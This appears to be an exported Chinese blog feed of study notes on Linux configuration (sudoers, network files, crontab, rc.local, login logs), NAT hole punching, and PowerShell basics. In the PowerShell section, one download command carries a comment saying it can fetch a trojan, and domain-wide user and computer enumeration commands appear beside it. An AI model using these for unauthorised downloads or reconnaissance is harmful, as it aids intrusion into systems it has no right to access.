文件</h2><p><code>sudo</code>配置文件存在于<code>/etc/sudoers</code>，root用户如想赋予普通用户sudo权限，则需要修改大概位于98行的内容：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">97 <span class="comment">## Allow root to run any commands anywhere</span></span><br><span class="line">98 root    ALL=(ALL)       ALL</span><br><span class="line">99 zhangsan    ALL=(ALL)       ALL</span><br><span class="line">100</span><br><span class="line">101 <span class="comment">## Allows members of the &#x27;sys&#x27; group to run networking, software,</span></span><br><span class="line">102 <span class="comment">## service management apps and more.</span></span><br><span class="line">103 <span class="comment"># %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS</span></span><br><span class="line">104 </span><br><span class="line">105 <span class="comment">## Allows people in group wheel to run all commands</span></span><br><span class="line">106 %wheel        ALL=(ALL)       ALL</span><br><span class="line">107 %group6        ALL=(ALL)       ALL</span><br><span class="line">108</span><br><span class="line">109 <span class="comment">## Same thing without a password</span></span><br><span class="line">110 <span class="comment"># %wheel        ALL=(ALL)       NOPASSWD: ALL</span></span><br></pre></td></tr></table></figure><p>如果给zhangsan用户添加sudo权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zhangsan    ALL=(ALL)    ALL</span><br></pre></td></tr></table></figure><p>如果给用户组添加sudo权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%group6    ALL=(ALL)    ALL</span><br></pre></td></tr></table></figure><p>group6 用户组的成员也有 sudo 权限。</p><h1 id="2-网络相关"><a href="#2-网络相关" class="headerlink" title="2. 网络相关"></a>2. 网络相关</h1><h2 id="2-1-网卡配置文件"><a href="#2-1-网卡配置文件" class="headerlink" title="2.1 网卡配置文件"></a>2.1 网卡配置文件</h2><h3 id="2-1-1-centos"><a href="#2-1-1-centos" class="headerlink" title="2.1.1 centos"></a>2.1.1 centos</h3><p>centos8之前的网卡文件存储于<code>/etc/sysconfig/network-scripts/ifcfg-[网卡名]</code> </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DEVICE=<span class="string">&quot;eth0&quot;</span>                                <span class="comment">#网卡名</span></span><br><span class="line">HWADDR=<span class="string">&quot;00:0C:29:FD:FF:2A&quot;</span>                   <span class="comment">#mac地址</span></span><br><span class="line">NM_CONTROLLED=<span class="string">&quot;yes&quot;</span>                          <span class="comment">#network mamager的参数，实时生效，不需要重启</span></span><br><span class="line">ONBOOT=<span class="string">&quot;yes&quot;</span>                                 <span class="comment">#开机自动链接</span></span><br><span class="line">IPADDR=192.168.1.31                          <span class="comment">#ip地址</span></span><br><span class="line">NETMASK=255.255.255.0                        <span class="comment">#子网掩码</span></span><br><span class="line">GATEWAY=192.168.1.1                          <span class="comment">#网关</span></span><br><span class="line">BOOTPROTO=static                             <span class="comment">#静态ip</span></span><br></pre></td></tr></table></figure><p>centos stream 9 的网卡文件存储于<code>/etc/NetworkManager/system-connections/ens33.nmconnection</code> </p><p>如果 [ipv4] 内只有 method&#x3D;auto 代表是 DHCP 自动分配 ip。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[connection]</span><br><span class="line"><span class="built_in">id</span>=ens33</span><br><span class="line">uuid=84ff994a-9e99-3366-bac4-683478ff4d8b</span><br><span class="line"><span class="built_in">type</span>=ethernet</span><br><span class="line">autoconnect-priority=-999</span><br><span class="line">interface-name=ens33</span><br><span class="line"></span><br><span class="line">[ethernet]</span><br><span class="line"></span><br><span class="line">[ipv4]</span><br><span class="line">address1=192.168.0.131/24,192.168.0.1</span><br><span class="line">dns=114.114.114.114;</span><br><span class="line">method=manual</span><br><span class="line"></span><br><span class="line">[ipv6]</span><br><span class="line">addr-gen-mode=eui64</span><br><span class="line">method=auto</span><br><span class="line"></span><br><span class="line">[proxy]</span><br></pre></td></tr></table></figure><h3 id="2-1-2-Ubuntu"><a href="#2-1-2-Ubuntu" class="headerlink" title="2.1.2 Ubuntu"></a>2.1.2 Ubuntu</h3><p><code>vi /etc/network/interfaces</code> 。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 若设置静态IP</span></span><br><span class="line">auto [网卡名]            </span><br><span class="line">iface [网卡名] inet static                            </span><br><span class="line">address 192.168.0.90                <span class="comment">#ip地址</span></span><br><span class="line">gateway 192.168.0.1                 <span class="comment">#网关</span></span><br><span class="line">netmask 255.255.255.0               <span class="comment">#子网掩码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 若设置动态IP</span></span><br><span class="line">auto [网卡名]</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure><h2 id="2-2-DNS"><a href="#2-2-DNS" class="headerlink" title="2.2 DNS"></a>2.2 DNS</h2><h3 id="2-2-1-centos"><a href="#2-2-1-centos" class="headerlink" title="2.2.1 centos"></a>2.2.1 centos</h3><p>DNS配置文件存储于<code>vi /etc/resolv.conf</code> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure><p><img src="/img/20220901211528.png"></p><p>老版本的centos可以直接在网卡文件中修改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns1=114.114.114.114</span><br><span class="line">dns2=8.8.8.8</span><br></pre></td></tr></table></figure><h3 id="2-2-2-Ubuntu"><a href="#2-2-2-Ubuntu" class="headerlink" title="2.2.2 Ubuntu"></a>2.2.2 Ubuntu</h3><p>DNS配置文件存储于<code>vi /etc/resolv.conf</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure><h1 id="3-服务相关"><a href="#3-服务相关" class="headerlink" title="3.服务相关"></a>3.服务相关</h1><p>&#x2F;etc&#x2F;init.d&#x2F;目录下的文件都可以用start启动。</p><p>apache2服务器</p><p><code>sudo /etc/init.d/apache2 start</code>  启动。<br><code>sudo /etc/init.d/apache2 restart</code> 重启。<br><code>sudo /etc/init.d/apache2 stop</code> 关闭。</p><p><code>sudo /etc/init.d/networking start</code> 启动网卡。</p><p>开启路由转发：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su root</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><h1 id="4-计划任务"><a href="#4-计划任务" class="headerlink" title="4.计划任务"></a>4.计划任务</h1><p><code>crontab</code>被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p><p><code>crontab -e</code> 编辑当前用户的cron表。</p><p>编辑cron的格式为：<code>分 时 日 月 周 命令</code> </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*    <span class="comment">#代表任意时间</span></span><br><span class="line">,    <span class="comment">#代表不联系的时间点，2,3 表示2和3都行</span></span><br><span class="line">-    <span class="comment">#代表连续的时间段，比如2-4表示2,3,4</span></span><br><span class="line">*/n  <span class="comment">#代表每隔单位时间</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220910181324.png"></p><p><img src="/img/20220910182352.png"></p><p><img src="/img/20220910181556.png"></p><p><img src="/img/20220910182259.png"></p><p><code>crontab -l</code> 查看当前用户的cron表。</p><p><img src="/img/20220910182621.png"></p><p>root用户使用此命令加上 -u 参数可以查看其他用户的计划任务。</p><p><img src="/img/20220910182517.png"></p><p><code>crontab -r</code> 删除当前用户的cron表。</p><p><code>crontab</code>命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表，我们可以在以下文件夹内找到相关配置文件。</p><ul><li><code>/var/spool/cron/</code> 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</li><li><code>/etc/crontab</code> 这个文件负责调度各种管理和维护任务。</li><li><code>/etc/cron.d/</code> 这个目录用来存放任何要执行的crontab文件或脚本。</li><li>我们还可以把脚本放在<code>/etc/cron.hourly</code>、<code>/etc/cron.daily</code>、<code>/etc/cron.weekly</code>、<code>/etc/cron.monthly</code>目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。</li></ul><p><img src="/img/20220910182857.png"></p><p>案例1：每隔一分钟往1文本里输入一条hello 的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*/1 * * * * echo &quot;hello&quot;&gt;&gt; /root/1</span><br></pre></td></tr></table></figure><p>案例2：每小时的第一分钟执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 * * * * echo &quot;hello&quot;&gt;&gt; /root/1</span><br></pre></td></tr></table></figure><p>案例3：每小时的第一分钟跟第二分钟执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,2 * * * * echo &quot;hello&quot;&gt;&gt; /root/1</span><br></pre></td></tr></table></figure><p>其他案例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实例1：每1分钟执行一次myCommand</span><br><span class="line">* * * * * myCommand</span><br><span class="line"></span><br><span class="line">实例2：每小时的第3和第15分钟执行</span><br><span class="line">3,15 * * * * myCommand</span><br><span class="line"></span><br><span class="line">实例3：在上午8点到11点的第3和第15分钟执行</span><br><span class="line">3,15 8-11 * * * myCommand</span><br><span class="line"></span><br><span class="line">实例4：每隔两天的上午8点到11点的第3和第15分钟执行</span><br><span class="line">3,15 8-11 */2  *  * myCommand</span><br><span class="line"></span><br><span class="line">实例5：每周一上午8点到11点的第3和第15分钟执行</span><br><span class="line">3,15 8-11 * * 1 myCommand</span><br><span class="line"></span><br><span class="line">实例6：每晚的21:30重启smb</span><br><span class="line">30 21 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line">实例7：每月1、10、22日的4 : 45重启smb</span><br><span class="line">45 4 1,10,22 * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line">实例8：每周六、周日的1 : 10重启smb</span><br><span class="line">10 1 * * 6,0 /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line">实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb</span><br><span class="line">0,30 18-23 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line">实例10：每星期六的晚上11 : 00 pm重启smb</span><br><span class="line">0 23 * * 6 /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line">实例11：每一小时重启smb</span><br><span class="line">0 */1 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line">实例12：晚上11点到早上7点之间，每隔一小时重启smb</span><br><span class="line">0 23-7/1 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><h1 id="5-开机自动执行命令"><a href="#5-开机自动执行命令" class="headerlink" title="5.开机自动执行命令"></a>5.开机自动执行命令</h1><p><code>/etc/rc.d/rc.local</code> 用于添加开机启动命令,<code>/etc/rc.local</code>是<code>/etc/rc.d/rc.local</code>的软链接，软连接相当于windows的快捷方式。</p><p><img src="/img/20220910190942.png"></p><p><img src="/img/20220910191058.png"></p><p>系统开机后会自动执行<code>/etc/rc.local</code>,换句话说，只要将你想执行的命令写入这个文件，<code>vi /etc/rc.local</code>，就可以做到开机自动执行。</p><p>如我们在此处写入<code>echo &#39;hello&#39; &gt;&gt; /root/hello</code>。</p><p>如果你是第一次使用这个文件，需要对其加上执行权限。<code>chmod +x /etc/rc.local</code></p><p><img src="/img/20220910191240.png"></p><p><img src="/img/20220910191334.png"></p><p>然后重启，我们会发现写入<code>/etc/rc.local</code> 的命令在开机时被执行了。</p><p><img src="/img/20220910191745.png"></p><p>备注：</p><p>老版本的系统中，控制服务启动的命令还有如下的内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig</span><br><span class="line">/etc/init.d/</span><br><span class="line">/etc/rc.d/init.d</span><br></pre></td></tr></table></figure><p>配置的方法可参考网上详细教程。</p><p>从centos7开始，系统的服务控制开始由systemctl替换早起版本的chkconfig与service的指令。</p><p>systemctl的服务的位置位于&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system中。</p><p>所以未来在应急响应的排查中，需要排查的目录需要依照操作系统的版本进行针对性的排查。</p><h1 id="6-登录信息"><a href="#6-登录信息" class="headerlink" title="6.登录信息"></a>6.登录信息</h1><p><code>/var/log/wtmp</code>文件</p><p><code>wtmp</code>文件是二进制文件,该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前。</p><p><strong>last 命令</strong></p><p><code>last</code>命令用于显示用户最近登录信息。单独执行last命令，它会读取&#x2F;var&#x2F;log&#x2F;wtmp的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</p><p>用法：<code>last [选项]</code></p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">last </span><br><span class="line">last -5  <span class="comment">#只显示5行</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220910202030.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为了玩绿帽谷我研究了一下内网穿透</title>
      <link href="/2023/05/18/%E4%B8%BA%E4%BA%86%E7%8E%A9%E7%BB%BF%E5%B8%BD%E8%B0%B7%E6%88%91%E7%A0%94%E7%A9%B6%E4%BA%86%E4%B8%80%E4%B8%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2023/05/18/%E4%B8%BA%E4%BA%86%E7%8E%A9%E7%BB%BF%E5%B8%BD%E8%B0%B7%E6%88%91%E7%A0%94%E7%A9%B6%E4%BA%86%E4%B8%80%E4%B8%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-起因"><a href="#1-起因" class="headerlink" title="1 起因"></a>1 起因</h1><p>本来用蒲公英联机打绿帽谷（星露谷物语）来着，但是联机体验略差，偶尔有卡顿的情况，然后想着找一款替代蒲公英的软件。就在我徜徉在百度之中寻找好的联机方法时，看到一篇内网穿透的文章，于是就想试试。</p><h1 id="2-什么是内网"><a href="#2-什么是内网" class="headerlink" title="2 什么是内网"></a>2 什么是内网</h1><p>通常情况下，<strong>内网</strong> 可以简单的理解为路由器创建的网络，连接到这个网络的电脑之间可以相互访问。</p><p><img src="/img/20220622124400.png"></p><p>不同的内网在不知道对方公网ip的情况下，无法互相通信。假如运营商给 <code>小明的路由器</code> 或 <code>李华的路由器</code> 分配了公网 IP，这个问题就迎刃而解。但是由于 IPv4 地址的稀缺，国内三大运营商（电信、移动、联通）基本都不给家宽用户分配公网 IP，更不用说一些二线小运营商了。</p><h1 id="3-QQ的通信原理"><a href="#3-QQ的通信原理" class="headerlink" title="3 QQ的通信原理"></a>3 QQ的通信原理</h1><p>当我了解到内网互相通信的原理的时候，我寻思QQ好友处于不同的内网是怎么在互联网中找到对方进行通信的呢？百度一番后大致了解到，是QQ做了内网穿透。参考大佬的文章：<a href="https://www.iteye.com/blog/f543711700-978044">https://www.iteye.com/blog/f543711700-978044</a> </p><p>众所周知，QQ是一个基于TCP&#x2F;UDP协议的通讯软件。</p><p>QQ客户端在局域网内，当我打开QQ登录到QQ服务器时，通过外网，我的客户端与QQ服务器建立了一个长连接。可以用<code>netstat -bn</code> 命令看到此连接的状态是 <code>ESTABLISHED</code>，这表示已经连接。</p><p><img src="/img/20220622112403.png"></p><p>可以看到我的内网ip是192.168.0.104，QQ服务器的IP地址是157.148.54.110</p><p>此时，在QQ服务器那面看到的连接的IP应该是我的局域网对外的IP（运营商的公网ip）。</p><p>假设我的运营商公网ip是219.154.172.208</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">假设通过QQ服务器看到的连接是：      </span><br><span class="line">157.148.54.110:443      219.154.172.208：31234    ESTABLISHED     </span><br></pre></td></tr></table></figure><p>这样，我的运营商公网ip上的31234端口对应的就是我机器上的4152端口。（由于我是发起方，这个数是变化的，动态的）</p><p>当有信息给我时，QQ服务器只需要发给我的运营商公网ip的55579端口即可。</p><p>这其实就是一个内网穿透，利用QQ服务器作为中转，实现两个内网互相通信，其他通信软件也大同小异，利用软件服务商的服务器做中转实现内网穿透。</p><h1 id="3-内网到公网"><a href="#3-内网到公网" class="headerlink" title="3 内网到公网"></a>3 内网到公网</h1><p>那么我的内网ip端口是怎么对应到运营商公网ip端口的呢？是NAT。 </p><p>NAT(Network AddressTranslators)，网络地址转换，NAT是在IP地址日益缺乏的情况下产生的，它的主要目的就是为了能够地址重用。NAT分为两大类，基本的NAT和NAPT(Network Address&#x2F;Port Translator)。</p><p>最开始NAT是运行在路由器上的一个功能模块。最先提出的是基本的NAT，这是在上世纪90年代中期提出的。基本的NAT就负责将子网内IP转化为一个全球唯一的IP然后发送出去。</p><p>另外一种NAT叫做NAPT，从名称上我们也可以看得出，NAPT不但会改变经过这个NAT设备的IP数据报的IP地址，还会改变IP数据报的TCP&#x2F;UDP端口。基本NAT的设备可能我们见的不多（我没有见到过），NAPT才是我们实现内网穿透的主角。</p><p><img src="/img/20220622134005.png"></p><p>有一个私有网络<code>192.168.0.*</code>，Client A是其中的一台计算机，这个网络的网关（一个NAT设备）的外网IP是143.97.33.11。如果Client   A中的某个进程（这个进程创建了一个UDPSocket,这个Socket绑定1234端口）想访问外网主机81.118.0.31的1235端口，那么当数据包通过NAT时会发生什么事情呢？</p><p>首先NAT会改变这个数据包的原IP地址，改为143.97.33.11。接着NAT会为这个传输创建一个Session，并且给这个Session分配一个端口，比如53420，然后改变这个数据包的源端口为53420。所以本来是（192.168.0.100:1234-&gt;81.118.0.31:1235）的数据包到了互联网上变为了（143.97.33.11:53420-&gt;81.118.0.31:1235）。</p><p> 一旦NAT创建了一个Session后，NAT会记住53420端口对应的是192.168.0.100的1234端口，以后从Server S1发送到NAT的53420端口的数据会被NAT自动的转发到192.168.0.100上。（注意：这里是说Server S1发送到53420端口的数据会被转发，其他的Server发送到这个端口的数据将被NAT抛弃）这样Client A就与Server S1建立以了一个连接。</p><p><strong>Server S2</strong></p><p>如果Client A的原来那个Socket(绑定了1234端口的那个UDP Socket)又接着向另外一个Server S2发送了一个UDP包，那么这个UDP包在通过NAT时会怎么样呢？<br>这时可能会有两种情况发生，一种是NAT再次创建一个Session，并且再次为这个Session分配一个端口号（比如：53421）。另外一种是NAT再次创建一个Session，但是不会新分配一个端口号，而是用原来分配的端口号53420。前一种NAT叫做SymmetricNAT，后一种叫做ConeNAT。我们期望我们的NAT是第二种，如果你的NAT刚好是第一种，那么很可能会有很多P2P软件失灵。（可以庆幸的是，现在绝大多数的NAT属于后者，即Cone NAT）</p><h1 id="4-内网穿透"><a href="#4-内网穿透" class="headerlink" title="4 内网穿透"></a>4 内网穿透</h1><p>我们看到，通过NAT,子网内的计算机向外连接是很容易的（NAT相当于透明的，子网内的和外网的计算机不用知道NAT的情况）。 </p><p>但是如果外部的计算机想访问子网内的计算机就比较困难了（而这正是P2P所需要的）。 </p><p>那么我们如果想从外部发送一个数据报给内网的计算机有什么办法呢？首先，我们必须在内网的NAT上打上一个“洞”（也就是前面我们说的在NAT上建立一个Session），这个洞(Session)不能由外部来打，只能由内网内的主机来打。而且这个洞(Session)是有方向的，比如从内部某台主机（比如：192.168.0.10）向外部的某个IP(比如：219.237.60.1)发送一个UDP包，那么就在这个内网的NAT设备上打了一个方向219.237.60.1的“洞”(Session)，这就是称为UDP  HolePunching的技术。以后219.237.60.1就可以通过这个洞(Session)与内网的192.168.0.10联系了。（但是其他的外网IP不能利用这个洞）。</p><p>现在该轮到我们的正题P2P了。有了上面的理论，实现两个内网的主机通讯就差最后一步了：两边都无法主动发出连接请求，谁也不知道谁的公网地址，那我们如何来打这个洞呢？我们需要一个中间人来联系这两个内网主机。 </p><p>现在我们来看看一个P2P软件的流程，以下图为例：</p><p><img src="/img/20220622150413.png"></p><p>首先，Client  A登录p2p软件的服务器Server S，假如NAT A为这次的Session分配了一个端口60000，那么ServerS收到的Client  A的地址是202.187.45.3:60000，这就是Client A的外网地址了。同样，Client B登录Server S，假如NAT  B给此次Session分配的端口是40000，那么Server S收到的B的地址是187.34.1.56:40000。</p><p>此时，Client  A与Client B都可以与Server S通信了。如果Client A此时想直接发送信息给Client  B，那么A可以从Server S那儿获得B的公网地址187.34.1.56:40000，是不是Client  A向这个地址发送信息，ClientB就能收到了呢？答案是不行，因为如果这样发送信息，NAT B会将这个信息丢弃（因为这样的信息是不请自来的，为了安全，大多数NAT都会执行丢弃动作）。那该怎么办呢？</p><p>首先我们假设Server  S是219.237.60.1：7000，当Clinet A（192.168.0.20：60000）向Server  S（219.237.60.1：7000）发送数据包，Server S是可以正常接收到数据，因为它是属于外型开放的服务器端口。</p><p><img src="/img/20220622152850.png"></p><p>当Server  S收到数据包后可以获知Clinet  A（192.168.0.20：60000）对外通信的临时session信息（这个叫临时的端口，假设是60000会过期，具体时间不同，一般是每30S发送一个keep连接以保证端口维持通信连接不断），Server S此时应将此信息保存起来。</p><p>而同时，Client B (192.168.0.10：40000)也在时刻向Server S发送心跳包（所谓的心跳包，其实就是为了让session保持活动，不至于被NAT清除），Server S就向Client B (192.168.0.10：40000)发送一个通知，让 Client B 发送探测包（这个数据包最好发几个）给 Client A（192.168.0.20：60000），其实是发送给NAT A（202.187.45.3:60000），然后探测包自动由NAT A转化为客户端内网IP和内网端口。</p><p>Client B  (192.168.0.10:4000)在发完探测包后再向Server S发送反馈包，说明自己已经向Client A（192.168.0.20：60000）发送了探测包。</p><p>Server S在收到反馈之后再向Client A（192.168.0.20：60000）转发反馈包，Client A（192.168.0.20：60000）在收到反馈包之后，再向原本要求请求的Client B  (192.168.0.10:4000)发送数据包，此时连接已经打通，实现穿透。</p><p><strong>探测包</strong> </p><p>探测包只是个普通的包，随便发点消息就可以。探测包其实就是为了在双方的NAT上建立隧道（session），比如Client B发给Client A探测包，但Client A在NAT A上找不到洞（session），就会把探测包丢弃。</p><p>但Client B通过发这个探测包，会在自己所在的NAT B上向NAT A打洞（session）。</p><p>Client A收到Server S转发的反馈包后，向Client B发送数据包，NAT A向NAT B打洞，此时在NAT A上也有了洞（session），隧道建成，实现穿透。然后Client B再向Client A发送数据包就不会被Client A丢弃了，NAT A有了通往对方的session，说明对方的信息是安全可信任的，不会丢掉对方的数据包。</p><p>当然，这种探测包一般会发好几次，直到对方应答。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PowerShell</title>
      <link href="/2023/05/08/windows%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/05/08/windows%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-什么是-PowerShell？"><a href="#1-什么是-PowerShell？" class="headerlink" title="1 什么是 PowerShell？"></a>1 什么是 PowerShell？</h1><p>PowerShell 由命令行 shell 和脚本语言两部分组成。 它最初是一种框架，用于在 Windows 中自动执行管理任务。 PowerShell 现已发展为一种跨平台工具，用于执行多种任务。</p><p>命令行 shell 缺少图形界面，让你无法使用鼠标与图形元素进行交互。 相反，你需要在计算机控制台中键入文本命令。 下面是使用控制台的一些优点：</p><ul><li>与控制台交互通常比使用图形界面快。</li><li>在控制台中，可以运行成批命令，因此它非常适合用于持续集成管道的任务自动化。</li><li>你可使用控制台与云资源和其他资源交互。</li><li>可在文本文件中存储命令和脚本，并使用源代码管理系统。 这可能是最大的优点之一，因为你的命令可重复且可审核。 在许多系统（特别是政府系统）中，必须跟踪和评估或审核一切内容。 审核涵盖了从数据库更改到脚本所做的更改的所有内容。</li></ul><p>功能</p><p>PowerShell 通过传统 shell 共享某些功能：</p><ul><li>内置帮助系统：大多数 shell 都有一些帮助系统，你可以在其中了解有关命令的详细信息。 例如，你可以了解命令的作用以及它支持的参数。 PowerShell 中的帮助系统提供有关命令的信息，并与联机帮助文章集成。</li><li>管道：传统 shell 使用管道按顺序运行多个命令。 一个命令的输出是下一个命令的输入。 PowerShell 实现了传统 shell 传达的这种概念，但它又有所不同，因为它对文本上的对象进行操作。 本模块稍后会详细介绍此功能。</li><li>别名：别名是可用于运行命令的替代名称。 PowerShell 支持使用常见别名，如 <code>cls</code>（清除屏幕）和 <code>ls</code>（列出文件）。 因此，对于熟悉的命令，新用户可利用其对其他框架的知识，而不必记住 PowerShell 名称。</li></ul><p>PowerShell 不同于传统的命令行 shell，具体体现在以下几方面：</p><ul><li><p><strong>它对文本上的对象进行操作。</strong> 在命令行 shell 中，你必须运行输出和输入可能不同的脚本，因此你最终会对输出进行格式化并提取所需的数据。 而在 PowerShell 中，可以使用对象作为输入和输出。 这意味着格式设置和数据提取所需时间会更少。</p></li><li><p><strong>它具有 cmdlet。</strong> PowerShell 中的命令称为 cmdlet（念作 commandlet）。 与其他许多 shell 环境不同，在 PowerShell 中，cmdlet 是在常见运行时而不是单独的可执行文件上生成的。 此特性在参数分析和管道行为方面提供了一致的体验。</p><p>Cmdlet 通常采用对象输入并返回对象。 PowerShell 中的核心 cmdlet 是在 .NET Core 中生成的，采用的是开放源代码形式。 你可以使用来自社区和其他来源的更多 cmdlet、脚本和函数来扩展 PowerShell，也可以在 .NET Core 或 PowerShell 中生成自己的 cmdlet。</p></li><li><p><strong>它具有多种类型的命令。</strong> PowerShell 中的命令可以是本机可执行文件、cmdlet、函数、脚本或别名。 运行的每个命令都属于这些类型之一。 由于 cmdlet 是一种命令，因此，命令和 cmdlet 通常可互换使用。</p></li></ul><p><strong>两种使用powershell的方法：</strong> </p><p><img src="/img/20230205104727.png"></p><p><img src="/img/20230205104820.png"></p><h1 id="2-powershell的指令与帮助"><a href="#2-powershell的指令与帮助" class="headerlink" title="2 powershell的指令与帮助"></a>2 powershell的指令与帮助</h1><p>获取指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-Command</span><br><span class="line">Get-Command -Name get-*</span><br></pre></td></tr></table></figure><p>获取帮助</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Get-Help Get-Process <span class="comment">#我的建议是不如直接百度Get-Process</span></span><br><span class="line">Get-Help Get-Process -Full</span><br></pre></td></tr></table></figure><h1 id="3-与Linux兼容的指令"><a href="#3-与Linux兼容的指令" class="headerlink" title="3 与Linux兼容的指令"></a>3 与Linux兼容的指令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">mkdir</span></span><br><span class="line"><span class="built_in">cd</span>   <span class="comment">#路径符号，windows右斜线\，linux左斜线/</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">cat</span></span><br><span class="line">ps </span><br><span class="line">netstat</span><br><span class="line">arp</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><h1 id="4-常用指令"><a href="#4-常用指令" class="headerlink" title="4 常用指令"></a>4 常用指令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Get-Process  <span class="comment">#相当于ps命令</span></span><br><span class="line">Get-ComputerInfo</span><br><span class="line">Get-HotFix   <span class="comment">#查看操作系统的补丁信息</span></span><br><span class="line">Get-ADComputer -Filter <span class="string">&#x27;*&#x27;</span> -Properties ipv4address <span class="comment">#查看域内所有机器的信息，带ipv4地址</span></span><br><span class="line">Get-ADComputer -Filter <span class="string">&#x27;*&#x27;</span> -Properties ipv4address |FT DNSHostName,IPv4Address,Name <span class="comment">#只显示FT后面要的信息</span></span><br><span class="line">Get-ADUser -Filter <span class="string">&#x27;*&#x27;</span></span><br><span class="line">Get-ADUser -Filter <span class="string">&#x27;*&#x27;</span>|FT Name,sid</span><br><span class="line">Get-Process |Select-Object Id,ProcessName |Out-File c:\share\ps.txt</span><br><span class="line"><span class="comment">#横向冒号多行用FT，竖向多列用Select-Object</span></span><br><span class="line">Invoke-WebRequest -Uri http://www.baidu.com -OutFile c:\1.html <span class="comment">#下载文件到本地，可以下载一个木马</span></span><br></pre></td></tr></table></figure><p><strong>线程句柄HANDLE与线程ID的关系</strong> </p><p>Handle仅在其所属的进程中才有意义。将一个进程拥有的handle传给另一个进程没有任何意义，如果非要这么做，则需要使用DuplicateHandle()，在多个进程间传递Handle是另外一个话题了，与这里要讨论的无关。 </p><ul><li>ID是在Windows系统范围内唯一标示Thread的。  </li><li>Handle是用来操作线程的，可以有多个，每个HANDLE可以有不同的操作权限，在不同进程OpenThread得到的值不一样。 </li><li>线程的ID是系统全局的，其HANDLE是进程局部的.</li><li>此ID只在线程的生存期内有效。</li><li>HANDLE是os和client之间用来操作进程和线程一个桥梁，os有一张维护HANDLE的表单，里面大概放置了HANDLE的引用计数和有关的属性，HANDLE是os标识进程和线程的东西，但是用户也可以用这个来标识进程和线程，对其操作；而ID是os用来标识进程和线程的,并且是全局唯一的,  但用户可以通过这个ID获得进程线程的HANDLE，多次得到的HANDLE并不一定是一样的。HANDLE是内核对象，而ID好像不是，并没有专门创建ID的函数。</li><li>ID是CreateThread时操作系统自动生成的。</li><li>线程的句柄和id是不同的。</li></ul><p> 